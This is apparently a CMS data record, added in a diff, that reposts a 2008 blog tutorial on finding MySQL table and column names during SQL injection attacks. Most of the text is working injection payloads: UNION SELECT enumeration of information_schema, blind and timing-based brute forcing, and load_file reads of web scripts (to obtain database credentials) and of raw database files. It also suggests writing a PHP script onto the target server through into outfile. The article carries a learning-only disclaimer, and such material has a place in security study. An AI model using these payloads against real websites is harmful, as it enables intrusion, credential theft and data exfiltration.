@@ -1,0 +1,109 @@
+a:4:{s:6:"record";a:1:{i:0;a:6:{s:10:"content_id";s:1:"9";s:11:"category_id";s:2:"23";s:12:"content_name";s:28:"MySQL table and column names";s:15:"content_summary";s:612:"<p><img height="120" width="120" src="http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/database.jpg" alt="" /></p>
+<p>Getting&nbsp;the table and column names within a SQL injection attack is often a problem and I&rsquo;ve seen a lot of questions about this on the internet. Often you need them to start further SQLi attacks to get the data. So&nbsp;this article shows you how I would try to get the data in different scenarios on MySQL. For other databases I recommend the extensive cheat sheets from <a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">pentestmonkey</a>.</p>";s:14:"content_detail";s:14599:"<h2><a title="Permanent Link: MySQL table and column&nbsp;names" rel="bookmark" href="http://websec.wordpress.com/2007/11/17/mysql-table-and-column-names/"><br />
+</a></h2>
+<div class="snap_preview">
+<p>Getting&nbsp;the table and column names within a SQL injection attack is often a problem and I&rsquo;ve seen a lot of questions about this on the internet. Often you need them to start further SQLi attacks to get the data. So&nbsp;this article shows you how I would try to get the data in different scenarios on MySQL. For other databases I recommend the extensive cheat sheets from <a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">pentestmonkey</a>.</p>
+<p><strong>Please note that attacking websites you are not allowed to attack is a crime and should not be done. This article is for learning purposes only.</strong></p>
+<p><a title="article&nbsp;overview" href="http://websec.files.wordpress.com/2007/11/names_overview.png"><img alt="article&nbsp;overview" src="http://websec.files.wordpress.com/2007/11/names_overview.png" /></a></p>
+<p>For the following injections I&rsquo;ll assume you understand the <a href="http://www.google.com/search?q=SQL%20injection">basics of SQL injection</a> and <a href="http://dev.mysql.com/doc/refman/5.1/en/union.html">union select</a>. My injections are written for&nbsp;a SELECT query with&nbsp;two columns, however don&rsquo;t forget to add <em>null</em>s <a href="http://devels-playground.blogspot.com/2007/08/union-select-column-count.html">in the right amount</a>.</p>
+<p><a title="1" name="1"></a><strong>1. The information_schema table</strong></p>
+<p><a title="1.a" name="1.a"></a><strong>1.a. Read information_schema table normally</strong></p>
+<p>Sometimes on MySQL &gt;=5.0 you can access the <a href="http://dev.mysql.com/doc/refman/5.0/en/information-schema.html">information_schema table</a>.<br />
+So you may want to check which MySQL version is running:<br />
+<em><strong>0&prime; UNION SELECT version(),null /*</strong></em><br />
+or:<br />
+<em><strong>0&prime; UNION SELECT @@version,null /*</strong></em></p>
+<p>Once you know which version is running, proceed with these steps (MySQL &gt;= 5.0) or <a href="http://websec.wordpress.com/2007/11/17/mysql-table-and-column-names/#2">jump to the next point</a>.</p>
+<p>You can either get the names step by step or at once.</p>
+<p>First, get the <em>tablenames</em>:<br />
+<em><strong>0&prime; UNION SELECT table_name,null FROM information_schema.tables WHERE version = &lsquo;9</strong></em><br />
+Note that <em>version=9</em> has nothing to do with the MySQL version. It&rsquo;s just an unique identifier for user generated tables, so leave as it is to ignore MySQL system table names.<br />
+<b>update:</b> Testing another MySQL version (5.0.51a) I noticed that the version is &ldquo;10&Prime; for user generated tables. so dont worry if you dont get any results. instead of the unique identifier you can also use &ldquo;LIMIT offset,amount&rdquo;.</p>
+<p>Second, get the <em>columnnames</em>:<br />
+<em><strong>0&prime; UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = &lsquo;tablename</strong></em></p>
+<p>Or with one injection:<br />
+<em><strong>0&prime; UNION SELECT column_name,table_name FROM information_schema.columns /*</strong></em><br />
+Unfortunetly there is no unique identifier, so you have to scroll through the whole information_schema table if you use this.</p>
+<p>Once you know table name and column name you can <em>union select</em> all the data you need.</p>
+<p>For more details about the information_schema table see the <a href="http://dev.mysql.com/doc/refman/5.0/en/information-schema.html">MySQL Documentation Library</a>. There you&rsquo;ll find other interesting columns you can add instead of <em>null</em>, for example <em>data_type</em>.</p>
+<p>Ok, that was the easiest part.</p>
+<p><a title="1.b" name="1.b"></a><strong>1.b. Read information_schema table blindly</strong></p>
+<p>Sometimes you can&rsquo;t see the output of your request, however there are some techniques to get the info blindly, called <a href="http://www.imperva.com/download.asp?id=4">Blind SQL Injection</a>. I&rsquo;ll assume you know the basics.<br />
+However, make sure you really need to use blind injection. Often you just have to make sure the actual result returns null and the output of your injection gets processed by the mysql_functions instead. Use something like <em> AND 1=0</em> to make sure the actual output is null and then append your union select to get your data, for example:<br />
+<em><strong>1&prime; AND 1=0 UNION SELECT @@version,null /*</strong></em></p>
+<p>If you really need blind SQL injection we&rsquo;ll go through the same steps as above, so first we try to get the version:<br />
+<em><strong>1&prime;AND <a href="http://dev.mysql.com/doc/refman/5.1/en/string-functions.html#function_substring">MID</a>(version(),1,1) like &lsquo;4</strong></em></p>
+<p>The request will be successfull and the same page will be displayed like as we did no injection if the version starts with &ldquo;4&Prime;. If not, I&rsquo;ll guess the server is running MySQL 5. Check it out:<br />
+<em><strong>1&prime;AND <a href="http://dev.mysql.com/doc/refman/5.1/en/string-functions.html#function_substring">MID</a>(version(),1,1) like &lsquo;5</strong></em></p>
+<p>Always remember to put a value before the actual injection which would give &ldquo;normal&rdquo; output. If the output does not differ, no matter what you&rsquo;ll inject try some benchmark tests:<br />
+<em><strong>1&prime; UNION SELECT (if(mid(version(),1,1) like 4, <a href="http://dev.mysql.com/doc/refman/5.0/en/information-functions.html#function_benchmark">benchmark</a>(100000,sha1(&rsquo;test&rsquo;)), &lsquo;false&rsquo;)),null /*</strong></em><br />
+But be careful with the benchmark values, you dont want to crash your browser ;-). I&rsquo;d suggest you to try some values first to get a acceptable response time.</p>
+<p>Once we know the version number you can proceed with these steps (MySQL &gt;= 5.0) or <a href="http://websec.wordpress.com/2007/11/17/mysql-table-and-column-names/#2">jump to the next point</a>.</p>
+<p>Since we cant read out the table name we have to brute it. Yes, that can be annoying, but who said it would be easy?<br />
+We&rsquo;ll use the same injection as in 1.), but now with blind injection technique:<br />
+<em><strong>1&prime; AND MID((SELECT table_name FROM information_schema.tables WHERE version = 9 LIMIT 1),1,1) &gt; &lsquo;m</strong></em></p>
+<p>Again, this will check if the first letter of our first table is alphabetically located behind &ldquo;m&rdquo;. As stated above, <em>version=9</em> has nothing to do with the MySQL version number and is used here to fetch only user generated tables.<br />
+Once you got the right letter, move on to the next:<br />
+<em><strong>1&prime; AND MID((SELECT table_name FROM information_schema.tables WHERE version = 9 LIMIT 1),2,1) &gt; &lsquo;m</strong></em><br />
+And so on.</p>
+<p>If you got the tablename you can brute its columns. This works as the same principle:<br />
+<em><strong>1&prime; AND MID((SELECT column_name FROM information_schema.columns WHERE table_name = &lsquo;tablename&rsquo; LIMIT 1),1,1) &gt; &lsquo;m</strong></em><br />
+<em><strong>1&prime; AND MID((SELECT column_name FROM information_schema.columns WHERE table_name = &lsquo;tablename&rsquo; LIMIT 1),2,1) &gt; &lsquo;m</strong></em><br />
+<em><strong>1&prime; AND MID((SELECT column_name FROM information_schema.columns WHERE table_name = &lsquo;tablename&rsquo; LIMIT 1),3,1) &gt; &lsquo;m</strong></em><br />
+And so on.</p>
+<p>To check the next name, just skip the first bruted <em>tablename</em> with <a href="http://dev.mysql.com/doc/refman/5.1/de/select.html">LIMIT</a> (see comments for more details about the index):<br />
+<em><strong>1&prime; AND MID((SELECT table_name FROM information_schema.tables WHERE version = 9 LIMIT 1,1),1,1) &gt; &lsquo;m</strong></em><br />
+Or <em>columnname</em>:<br />
+<em><strong>1&prime; AND MID((SELECT column_name FROM information_schema.columns WHERE table_name = &lsquo;tablename&rsquo; LIMIT 1,1),1,1) &gt; &lsquo;m</strong></em></p>
+<p>Sometimes it also makes sense to check the length of the name first, so maybe you can guess it easier the more letters you reveal.<br />
+Check for the tablename:<br />
+<em><strong>1&prime; AND MID((SELECT table_name FROM information_schema.tables WHERE version = 9 LIMIT 1),6,1)=&rsquo;</strong></em><br />
+Or for the column name:<br />
+<em><strong>1&prime; AND MID((SELECT column_name FROM information_schema.columns WHERE table_name = &lsquo;tablename&rsquo; LIMIT 1),6,1)=&rsquo;</strong></em><br />
+Both injections check if the sixth letter is not empty. If it is, and the fifth letter exists, you know the name is 5 letters long.</p>
+<p>Since we know that the information_schema table has 33 entries by default we can also check out how many user generated tables exist. That means that every entry more than 33 is a table created by a user.<br />
+If the following succeeds, it means that there is one user generated table:<br />
+<em><strong>1&prime; AND 34=(SELECT COUNT(*) FROM information_schema.tables)/*</strong></em><br />
+There are two tables if the following is true:<br />
+<em><strong>1&prime; AND 35=(SELECT COUNT(*) FROM information_schema.tables)/*</strong></em><br />
+And so on.</p>
+<p><a title="2" name="2"></a><strong>2. You don&rsquo;t have access to information_schema table</strong></p>
+<p>If you don&rsquo;t have access to the information_schema table (default) or hit a MySQL version &lt; 5.0 it&rsquo;s quite difficult on MySQL.<br />
+There is only one error message I could find that reveals a name:<br />
+<em><strong>1&prime;%&rsquo;0</strong></em><br />
+<em>Query failed: Column &lsquo;id&rsquo; cannot be null</em></p>
+<p>But that doesnt give you info on other column or table names and only works if you can access error messages. However, it could make guessing the other names easier.</p>
+<p>If you don&rsquo;t want to use a bruteforce tool we will have to use <a href="http://dev.mysql.com/doc/refman/4.1/en/string-functions.html#function_load-file">load_file</a>. But that will require that you can see the output of course.</p>
+<p><em>&ldquo;To use this function, the file must be located on the server host, you must specify the full pathname to the file, and you must have the FILE privilege. The file must be readable by all and its size less than max_allowed_packet bytes.&rdquo;</em></p>
+<p>You can read out <a href="http://dev.mysql.com/doc/refman/5.1/de/program-variables.html">max_allowed_packet</a> on MySQL 5<br />
+<em><strong>0&prime; UNION SELECT @@max_allowed_packet,null /*</strong></em><br />
+Mostly you&rsquo;ll find the standard value <em>1047552</em> (Byte).</p>
+<p>Note that load_file always starts to look in the <em>datadir</em>. You can read out the datadir with:<br />
+<em><strong>0&prime; UNION SELECT @@datadir,null /*</strong></em><br />
+So if your <em>datadir</em> is <em>/var/lib/mysql</em> for example, <em>load_file(&rsquo;file.txt&rsquo;)</em> will look for <em>/var/lib/mysql/file.txt</em>.</p>
+<p><a title="2.a" name="2.a"></a><strong>2.a. Read the script file</strong></p>
+<p>Now, the first thing I would try is to load the actual script file. This not only gives you the exact query with all table and column names, but also the database connection credentials. A file read <em>could</em> look like this:</p>
+<p><em><strong>0&prime; UNION SELECT load_file(&rsquo;../../../../Apache/htdocs/path/file.php&rsquo;),null /*</strong></em> (Windows)<br />
+<em><strong>0&prime; UNION SELECT load_file(&rsquo;../../../var/www/path/file.php&rsquo;),null /*</strong></em> (Linux)</p>
+<p>The amount of directories you have to jump back with <em>../</em> is the amount of directories the <em>datadir</em> path has. After that follows the webserver path.<br />
+All about file privileges and webserver path can be found in my <a href="http://websec.wordpress.com/2007/11/17/mysql-into-outfile/">article about into outfile</a>.<br />
+Once you got the script you can also use <em>into outfile</em> combined with <em>OR 1=1</em> to write the whole output to a file or to set up a little PHP script on the target webserver which reads out the whole database (or the information you want) for you.</p>
+<p><a title="2.b" name="2.b"></a><strong>2.b) Read the database file</strong></p>
+<p>On MySQL 4&nbsp;and&nbsp;5 you can also use <em>load_file</em> to get the table content.</p>
+<p>The database files are usually stored in<br />
+<em>@@datadir/databasename/</em></p>
+<p>Take a look at <a href="http://websec.wordpress.com/2007/11/17/mysql-table-and-column-names/#2">step 2.</a> how to get the <em>datadir</em>. An injection we need to read the database content looks like this:</p>
+<p><em><strong>0&prime; UNION SELECT load_file(&rsquo;databasename/tablename.MYD&rsquo;),null /*</strong></em></p>
+<p>As you can see we need the databasename and tablename first. The databasename is easy:<br />
+<em><strong>0&prime; UNION SELECT database(),null /*</strong></em></p>
+<p>The table name is the hard part. Actually you can only guess or bruteforce it with a good wordlist and something like:</p>
+<p><em><strong>0&prime; UNION SELECT &rsquo;success&rsquo;,null FROM testname /*</strong></em></p>
+<p>This will throw an error if testname does not exists, or display &ldquo;success&rdquo; if tablename testname exists.<br />
+If you try to guess the name, have a look at all errors, vars and html sources you can get to get an idea of how they could have named the table / columns. Often it is not as difficult as it seems first.<br />
+You can find a small wordlist for common tablenames <a href="http://raz0r.name/wp-content/uploads/2008/06/common_tbl.txt">here</a> (by Raz0r).</p>
+<p>Also note that the file loaded with <em>load_file()</em> must be smaller than <em>max_allowed_packet</em> so this wont work on huge database files, because the standard value is ~1 MB which will suffice for <em>only</em> about 100.000 entries (if my calculation is right ;-))</p>
+<p><a title="2.c" name="2.c"></a><strong>(2.c. Compromising the server)</strong></p>
+<p>There are no other ways to get the data as far as I know, except of compromising the server via <a href="http://websec.wordpress.com/2007/11/17/mysql-into-outfile/">MySQL into outfile</a> or with other techniques which are beyond the scope of this article (e.g. LFI).</p>
+<p>&nbsp;</p>
+</div>
+<p>&nbsp;</p>";s:9:"post_date";s:10:"2008-11-19";}}s:11:"currentPage";i:1;s:14:"numberOfRecord";i:1;s:12:"numberOfPage";i:1;}
